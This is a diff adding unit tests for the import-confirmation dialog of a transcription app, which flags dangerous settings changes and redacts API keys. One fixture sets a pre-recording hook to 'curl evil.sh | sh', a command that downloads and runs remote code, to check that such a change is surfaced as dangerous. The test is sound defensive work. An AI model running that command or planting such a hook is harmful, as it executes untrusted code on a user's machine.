@@ -179,6 +179,68 @@ test('import diff summary and dangerous rows', () => {
   assert.equal(Model.diffSummary(null), 'Nothing to import');
 });
 
+test('settingsRows renders EVERY settings change, dangerous first, redaction-safe, capped with an overflow line', () => {
+  const diff = {settings_change: [
+    {path: 'audio.device', old: 'default', new: 'yeti', dangerous: false},
+    {path: 'output.pre_recording_command', old: '', new: 'curl evil.sh | sh', dangerous: true},
+    {path: 'whisper.remote_api_key', dangerous: true, redacted: true, old_set: true, new_set: true},
+    {path: 'whisper.model', old: 'base', new: 'tiny', dangerous: false},
+  ]};
+  const rows = Model.settingsRows(diff);
+  assert.equal(rows.length, 4, 'nothing collapses into a bare count');
+  same(rows.map(r => r.dangerous), [true, true, false, false], 'dangerous rows sort first');
+  assert.equal(rows[0].text, 'output.pre_recording_command:  → curl evil.sh | sh');
+  assert.equal(rows[1].text, 'whisper.remote_api_key will be replaced');
+  assert.doesNotMatch(rows[1].text, /undefined|→/, 'a redacted row never gets a value formatter');
+  assert.equal(rows[2].text, 'audio.device: default → yeti');
+  assert.equal(rows[3].text, 'whisper.model: base → tiny');
+  for (const r of rows) assert.equal(r.overflow, false);
+
+  // Arbitrary length: the bridge's dangerous set grew, the card must not.
+  const many = [];
+  for (let i = 0; i < 30; i++) many.push({path: 'meeting.hook' + i, old: 'a', new: 'b', dangerous: i < 3});
+  const capped = Model.settingsRows({settings_change: many}, 12);
+  assert.equal(capped.length, 13, '12 rows plus one overflow line');
+  assert.equal(capped[12].overflow, true);
+  assert.equal(capped[12].text, 'and 18 more changes');
+  assert.equal(capped.slice(0, 3).every(r => r.dangerous), true, 'dangerous rows are never the ones cut');
+  assert.equal(Model.settingsRows({settings_change: many.slice(0, 13)}, 12)[12].text, 'and 1 more change');
+  same(Model.settingsRows(null), []);
+  same(Model.settingsRows({}), []);
+  assert.equal(Model.settingsRows({settings_change: [null, {path: 'a', old: 1, new: 2}]}).length, 1, 'junk rows are dropped');
+});
+
+test('importConfirmation tiers the dialog and only claims an acknowledgement it could show', () => {
+  const one = Model.importConfirmation('bundle.json', {settings_change: [{path: 'engine', old: 'a', new: 'b', dangerous: true}]});
+  assert.match(one.message, /^Import bundle\.json\?/);
+  assert.match(one.message, /⚠ engine: a → b/);
+  assert.equal(one.confirmText, 'Import anyway');
+  assert.equal(one.accept, true);
+  assert.equal(one.dangerous, 1);
+
+  const clean = Model.importConfirmation('b.json', {vocab_add: ['x'], settings_change: [{path: 'p', old: 1, new: 2, dangerous: false}]});
+  assert.equal(clean.confirmText, 'Import');
+  assert.equal(clean.accept, false, 'no dangerous rows: accept_dangerous must stay false');
+  assert.doesNotMatch(clean.message, /⚠/);
+
+  const mid = [];
+  for (let i = 0; i < 15; i++) mid.push({path: 'meeting.hook' + i, old: 'a', new: 'b', dangerous: true});
+  const midConfirm = Model.importConfirmation('b.json', {settings_change: mid});
+  assert.equal(midConfirm.accept, true, 'every path is still named');
+  for (let i = 0; i < 15; i++) assert.match(midConfirm.message, new RegExp('meeting\\.hook' + i + '\\b'));
+
+  const huge = [];
+  for (let i = 0; i < 25; i++) huge.push({path: 'meeting.hook' + i, old: 'a', new: 'b', dangerous: true});
+  const hugeConfirm = Model.importConfirmation('b.json', {settings_change: huge});
+  assert.equal(hugeConfirm.accept, false, 'unreviewable: the bridge refusal must do the work');
+  assert.match(hugeConfirm.message, /25 dangerous changes/);
+
+  // A redacted dangerous row is described, never formatted.
+  const secret = Model.importConfirmation('b.json', {settings_change: [{path: 'whisper.remote_api_key', dangerous: true, redacted: true, old_set: true, new_set: true}]});
+  assert.match(secret.message, /whisper\.remote_api_key will be replaced/);
+  assert.doesNotMatch(secret.message, /undefined/);
+});
+
 test('sanitize strips control and bidi characters and caps length', () => {
   assert.equal(Model.sanitize('a\u202eb\u0000c'), 'abc');
   assert.equal(Model.sanitize('x'.repeat(300)).length, 200);
